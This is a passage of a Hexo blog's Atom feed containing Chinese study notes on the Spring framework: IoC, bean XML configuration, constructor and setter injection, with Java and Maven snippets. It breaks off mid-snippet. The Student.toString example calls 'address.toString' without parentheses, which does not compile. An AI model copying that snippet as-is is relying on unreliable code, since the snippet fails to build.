<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-04-26T11:30:29.884Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>狂神spring笔记</title>
    <link href="http://example.com/2025/04/26/java/sping/README/"/>
    <id>http://example.com/2025/04/26/java/sping/README/</id>
    <published>2025-04-26T19:29:00.000Z</published>
    <updated>2025-04-26T11:30:29.884Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1.Spring</p><h3 id="1-1、简介"><a href="#1-1、简介" class="headerlink" title="1.1、简介"></a>1.1、简介</h3><ul><li><p>Spring：春天—&gt; 给软件行业带来了春天</p></li><li><p>2002年，Rod Jahnson首次推出了Spring框架雏形interface21框架。</p></li><li><p>2004年3月24日，Spring框架以interface21框架为基础，经过重新设计，发布了1.0正式版。</p></li><li><p>很难想象Rod Johnson的学历 , 他是悉尼大学的博士，然而他的专业不是计算机，而是音乐学。</p></li><li><p>Spring理念 : 使现有技术更加实用 . 本身就是一个大杂烩 , 整合现有的框架技术</p></li><li><p>SSH : Struct2 + Spring + Hibernate!</p></li><li><p>SSM : SpringMvc + Spring + Mybatis!</p></li><li><p>官网 : <a class="link"   href="http://spring.io/" >http://spring.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>官方下载地址 : <a class="link"   href="https://repo.spring.io/libs-release-local/org/springframework/spring/" >https://repo.spring.io/libs-release-local/org/springframework/spring/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>GitHub : <a class="link"   href="https://github.com/spring-projects" >https://github.com/spring-projects <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li></ul><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="1-2、优点"><a href="#1-2、优点" class="headerlink" title="1.2、优点"></a>1.2、优点</h3><ul><li>Spring是一个开源免费的框架 , 容器 </li><li>Spring是一个轻量级的框架 , 非侵入式的 .</li><li><strong>控制反转 IoC  , 面向切面 Aop</strong></li><li>对事物的支持 , 对框架的支持</li></ul><p><strong>总结一句话：Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器（框架）。</strong></p><h3 id="1-3、组成"><a href="#1-3、组成" class="headerlink" title="1.3、组成"></a>1.3、组成</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/1078856-20170205160357354-490660449.gif"                      alt="1078856-20170205160357354-490660449"                ></p><ul><li><strong>核心容器</strong>：核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用<em>控制反转</em>（IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。</li><li><strong>Spring 上下文</strong>：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。Spring 上下文包括企业服务，例如 JNDI、EJB、电子邮件、国际化、校验和调度功能。</li><li><strong>Spring AOP</strong>：通过配置管理特性，Spring AOP 模块直接将面向切面的编程功能 , 集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理任何支持 AOP的对象。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖组件，就可以将声明性事务管理集成到应用程序中。</li><li><strong>Spring DAO</strong>：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。</li><li><strong>Spring ORM</strong>：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。</li><li><strong>Spring Web 模块</strong>：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。所以，Spring 框架支持与 Jakarta Struts 的集成。Web 模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。</li><li><strong>Spring MVC 框架</strong>：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。</li></ul><h3 id="1-4、拓展"><a href="#1-4、拓展" class="headerlink" title="1.4、拓展"></a>1.4、拓展</h3><p>在Spring的官网有这个介绍：现代化的java开发！说白就是基于Spring的开发！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/1.png"                      alt="1078856-20170205160357354-490660449"                ></p><ul><li>Spring Boot<ul><li>一个快速开发的脚手架</li><li>基于SpringBoot可以快速开发单个微服务</li><li>约定大于配置！</li></ul></li><li>Spring Cloud<ul><li>Spring CLoud是基于SpringBoot实现的</li></ul></li></ul><p>因为现在大所述公司都在使用SpringBoot进行快速开发，学习SpringBoot的前提，需要完全掌握Spring及SpringMVC！承上启下的作用</p><p><strong>弊端：发展太久了之后，违背了原来的理念！配置十分繁琐，人称：“配置地狱”！</strong></p><h2 id="2、IOC理论推导"><a href="#2、IOC理论推导" class="headerlink" title="2、IOC理论推导"></a>2、IOC理论推导</h2><h3 id="2-1、IoC基础"><a href="#2-1、IoC基础" class="headerlink" title="2.1、IoC基础"></a>2.1、IoC基础</h3><p>1.UserDao接口</p><p>2.UserDaoImpl实现类</p><p>3.UserService业务接口</p><p>4.UserServiceImpl业务实现类</p><p>在我们之前的业务中，用户的需求可能会影响我们原来的代码，我们需要更具用户的需求去修改源代码！如果程序代码量十分大，修改一次的成本代价十分昂贵！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/2.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>我们使用一个Set接口实现，已经发生了革命性的变化！</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用set进行动态实现值的注入</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>之前，程序是主动创建对象！控制权在程序员手上！</li><li>使用了set注入之后，程序不再有主动性，而是变成了被动的接受对象！</li></ul><p>这种思想从本质上实现了问题，我们程序员不用再去管理对象的创建了。系统的耦合性大大降低，可以更加专注的在业务的实现上！这是IOC的原型！</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/3.png"                      alt="1078856-20170205160357354-490660449"                ></p><h3 id="2-2、IOC本质"><a href="#2-2、IOC本质" class="headerlink" title="2.2、IOC本质"></a>2.2、IOC本质</h3><p><strong>控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法</strong>，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。</p><p>采用XML方式配置Bean的时候，Bean的定义信息是和实现分离的，而采用注解的方式可以把两者合为一体，Bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。</p><p><strong>控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。</strong></p><h2 id="3、HelloSpring"><a href="#3、HelloSpring" class="headerlink" title="3、HelloSpring"></a>3、HelloSpring</h2><p><strong>导入Jar包</strong></p><p>注 : spring 需要导入commons-logging进行日志记录 . 我们利用maven , 他会自动下载对应的依赖项 .</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>编写代码</strong></p><p>1、编写一个Hello实体类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStr</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;str=&#x27;&quot;</span> + str + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>2、编写我们的spring文件 , 这里我们命名为beans.xml</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--bean就是java对象 , 由Spring创建和管理</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    类型 变量名 = new 类型();</span></span><br><span class="line"><span class="comment">    Hello hello = new Hello();</span></span><br><span class="line"><span class="comment">    bean = 对象   new Hello();</span></span><br><span class="line"><span class="comment">    id = 变量名</span></span><br><span class="line"><span class="comment">    class = new的对象</span></span><br><span class="line"><span class="comment">    property 相当于给对象中的属性设置一个变量</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>3、我们可以去进行测试了 .</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取Spring的上下文对象</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//我们的对象现在都在Spring中管理了，我们要使用，直接去里面取出来就可以</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello)context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>思考问题？</strong></p><ul><li>Hello 对象是谁创建的 ?  </li><li>hello 对象是由Spring创建的</li><li>Hello 对象的属性是怎么设置的 ?  </li><li>hello 对象的属性是由Spring容器设置的</li></ul><p>这个过程就叫控制反转 :</p><ul><li>控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 , 使用Spring后 , 对象是由Spring来创建的</li><li>反转 : 程序本身不创建对象 , 而变成被动的接收对象 </li><li>依赖注入 : 就是利用set方法来进行注入的.</li></ul><p> IOC是一种编程思想，由主动的编程变成被动的接收</p><p>可以通过new ClassPathXmlApplicationContext去浏览一下底层源码 </p><p>**OK , 到了现在 , 我们彻底不用再程序中去改动了 , 要实现不同的操作 , 只需要在xml配置文件中进行修改 , 所谓的IoC,一句话搞定 : 对象由Spring 来创建 , 管理 , 装配 ! **</p><h2 id="4、IOC创建对象的方式"><a href="#4、IOC创建对象的方式" class="headerlink" title="4、IOC创建对象的方式"></a>4、IOC创建对象的方式</h2><p>1.使用无参构造创建对象，默认！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--无参构造器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>2.假设我们要使用有参构造创建对象。</p><ol><li><p>下标赋值</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--有参构造器1，下标赋值--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神说Java&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>类型</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--有参构造器2，类型，但同类型只能一个，不建议使用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>参数名</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--有参构造器3，参数名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ol><p>总结：在配置文件加载的时候。其中管理的对象都已经初始化了！</p><h2 id="5、Spring配置"><a href="#5、Spring配置" class="headerlink" title="5、Spring配置"></a>5、Spring配置</h2><h3 id="5-1、别名"><a href="#5-1、别名" class="headerlink" title="5.1、别名"></a>5.1、别名</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--别名，如果添加了别名也可以使用别名获取到这个对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;userNew&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="5-2、Bean的配置"><a href="#5-2、Bean的配置" class="headerlink" title="5.2、Bean的配置"></a>5.2、Bean的配置</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        id:bean的唯一标识符，也就是相当于我们学的对象名</span></span><br><span class="line"><span class="comment">        class：bean 对象所对应的权限定名：包名 + 类型</span></span><br><span class="line"><span class="comment">        name: 也是别名,而且name更高级，可以起多个别名，通过逗号空格分号等分割</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.UserT&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userT2,t2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;西部开源&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="5-3、import"><a href="#5-3、import" class="headerlink" title="5.3、import"></a>5.3、import</h3><p>团队的合作通过import来实现 ,可以将多个配置文件，导入合并为一个</p><p>假设，现在项目中有多个人开发，这三个人复制不同的类开发，不同的类需要不同的bean中，我们可以利用import将所有人的beans.xml合并为一个总的</p><ul><li>张三 beans.xml</li><li>李四 beans2.xml</li><li>王五 beans3.xml</li><li>applicationContext</li></ul><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans2.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans3.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用的时候，直接使用总的配置就可以了</p><h2 id="6、依赖注入"><a href="#6、依赖注入" class="headerlink" title="6、依赖注入"></a>6、依赖注入</h2><h3 id="6-1、构造器注入"><a href="#6-1、构造器注入" class="headerlink" title="6.1、构造器注入"></a>6.1、构造器注入</h3><p>前面已经说过了</p><h3 id="6-2、set方式注入【重点】"><a href="#6-2、set方式注入【重点】" class="headerlink" title="6.2、set方式注入【重点】"></a>6.2、set方式注入【重点】</h3><ul><li>依赖注入（Dependency Injection,DI）。<ul><li>依赖 : 指Bean对象的创建依赖于容器 . Bean对象的依赖资源 .</li><li>注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配 .</li></ul></li></ul><p>【环境搭建】</p><ol><li><p>复杂类型 Address.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Address&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>真实测试对象 Student.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Address <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(Address address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getBooks() &#123;</span><br><span class="line">        <span class="keyword">return</span> books;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBooks</span><span class="params">(String[] books)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.books = books;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getHobbies</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbies</span><span class="params">(List&lt;String&gt; hobbies)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">getCard</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> card;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCard</span><span class="params">(Map&lt;String, String&gt; card)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.card = card;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;String&gt; <span class="title function_">getGames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> games;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGames</span><span class="params">(Set&lt;String&gt; games)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.games = games;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWife</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> wife;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWife</span><span class="params">(String wife)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.wife = wife;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInfo</span><span class="params">(Properties info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, address=&quot;</span> + address.toString +</span><br><span class="line">                <span class="string">&quot;, books=&quot;</span> + Arrays.toString(books) +</span><br><span class="line">                <span class="string">&quot;, hobbies=&quot;</span> + hobbies +</span><br><span class="line">                <span class="string">&quot;, card=&quot;</span> + card +</span><br><span class="line">                <span class="string">&quot;, games=&quot;</span> + games +</span><br><span class="line">                <span class="string">&quot;, wife=&#x27;&quot;</span> + wife + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, info=&quot;</span> + info +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>beans.xml</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span 